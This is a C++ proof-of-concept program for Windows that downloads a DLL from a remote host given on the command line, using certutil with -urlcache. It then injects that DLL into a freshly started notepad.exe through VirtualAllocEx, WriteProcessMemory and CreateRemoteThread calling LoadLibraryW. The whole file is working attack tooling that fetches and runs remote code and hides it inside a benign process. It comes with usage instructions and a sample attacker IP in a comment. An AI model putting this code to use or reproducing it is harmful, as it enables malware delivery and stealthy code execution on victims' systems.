


/*

Process Injection Program. POC done with notepad.exe but can be changed within the program code.
Certutil is used to download and the URL is pulled from arguments.
Limitations:
1. No CrossPlatform Support. Has to be compiled in the target machine
2. URL Download file name has to be payload.dll. No string manipulation available.

Whole command: <filename.exe> http//xxx.xxx.xxx.xxx/payload.dll

*/



#include <windows.h>
#include <iostream>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <winbase.h>
#include <string>
#include "atlstr.h"
#include <tchar.h>

using namespace std;

int APIENTRY _tWinMain(HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPTSTR    lpCmdLine,
    int       nCmdShow)

    //int main() // Only to debug. Change linker target to Console if needed to use int main //
{
    LPCWSTR arg = lpCmdLine;
    WCHAR cert[200] = L" -urlcache -split -f ";

    int len = lstrlen(arg);

    if (len < 1)
    {
        MessageBoxA(NULL, "QUITTING!!! Please specifiy download parameters. file.exe url/payload.dll", "Argument Error", MB_OK | MB_ICONQUESTION);
        exit(1);
    }

    else
    {
        wcscat_s(cert, arg);
        MessageBoxW(NULL, arg, L"Arguments Supplied", MB_OK | MB_ICONQUESTION); // OPTIONAL //
    }


    DWORD PID;

    HANDLE ProcHnd;
    PVOID64 buffer;
    HANDLE thread;
    string filename = "\\payload.dll";

    STARTUPINFOW initInfo = { 0 }; // initialized starup info strucuture //
    initInfo.cb = sizeof(initInfo); // initialized size of stucture element //
    PROCESS_INFORMATION procInfo = { 0 }; // initialized proc info structure //
    PROCESS_INFORMATION CertUtilprocInfo = { 0 };
    LPCSTR notepad = "C:\\Windows\\notepad.exe";
    WCHAR downloader[100] = L"C:\\Windows\\System32\\certutil.exe";
    // LPCSTR payload = " -split -urlcache -f http://192.168.1.112/hw.dll";
    LPCWSTR payload = cert;

    CreateProcessA(notepad, NULL, NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOA)&initInfo, &procInfo);
    cout << "Notepad PID: " << procInfo.dwProcessId << endl; // fetched process ID //
    PID = procInfo.dwProcessId; // fetched process ID //
    cout << "Process ID of Notepad: " << PID << endl;
    if (CreateProcessW(downloader, cert, NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOW)&initInfo, &CertUtilprocInfo))
    {
        cout << "Download to Current Directory Successful! " << endl;
        // DWORD downloaderPID = CertUtilprocInfo.dwProcessId;  // OPTIONAL
        Sleep(8000);
    }

    char cwd[4096];
    GetCurrentDirectoryA(4000, cwd);
    string loc = cwd + filename;
    cout << "Current Dir / DLL: " << loc << endl;


    ProcHnd = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(PID));

    if (ProcHnd == NULL)
    {
        printf("Failed to open a process for PID %d", PID);
        printf("\n");
        return 0;
    }
    else
    {
        printf("Successfully Opened Process!", ProcHnd);
        printf("\n");
    }

    // TCHAR relativePath[4096] = TEXT(""); // For manual inputs -> OPTIONAL
    TCHAR absolutePath[4096] = TEXT("");
    // TCHAR absolutePath[4096]; // For manual inputs -> OPTIONAL

    CString csloc = loc.c_str(); // converting std::string loc to CString

    //cout << "Enter DLL Path for injection: " << endl; // For manual inputs -> OPTIONAL
    //wcin >> relativePath; // For manual inputs -> OPTIONAL

    TCHAR convert = GetFullPathNameW(csloc, 4096, absolutePath, NULL);

    /*
    if (convert == 0)
    {
        printf("Failed to determine path. \n");
        cout << GetLastError() << endl;
    }
    else
    {
        printf("Absolute Path is: %p", absolutePath);
        printf("\n");
    }
    */ // For manual inputs to convert relative to absolute path -> OPTIONAL

    buffer = VirtualAllocEx(ProcHnd, NULL, sizeof(absolutePath) + 10000, MEM_COMMIT, PAGE_READWRITE);

    if (!buffer)
    {
        printf("Failed to allocate Memory! \n");
        cout << GetLastError() << endl;
    }
    else
    {
        printf("Memory Allocated. Base Address: %p ", buffer);
        printf("\n");
    }

    int write = WriteProcessMemory(ProcHnd, buffer, absolutePath, sizeof(absolutePath), NULL);

    if (write == 0)
    {
        printf("Error Writing to process memory! \n");
        cout << GetLastError() << endl;
    }
    else
    {
        printf("Writing to Process Memory successful!!! \n");
        cout << "Return Value: " << write << endl;
    }

    LPVOID libraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(TEXT("KERNEL32.DLL")), "LoadLibraryW");

    if (!libraryAddress)
    {
        printf("Failed to import library address %p ", libraryAddress);
        printf("\n");
    }

    printf("\n ##### Injecting into Process ##### \n");

    thread = CreateRemoteThread(ProcHnd, NULL, 0, (LPTHREAD_START_ROUTINE)libraryAddress, buffer, 0, NULL);


    if (thread == NULL)
    {
        printf("Failed to inject into process! \n ");
        cout << GetLastError() << endl;
    }
    else
    {
        printf("Successfully started remote thread! \n");
        cout << "Return Value: " << thread << endl;
    }

    WaitForSingleObject(thread, INFINITE);

    //system("pause"); // For console mode -> OPTIONAL

    return 0;
    //exit(1); // For console mode -> OPTIONAL

}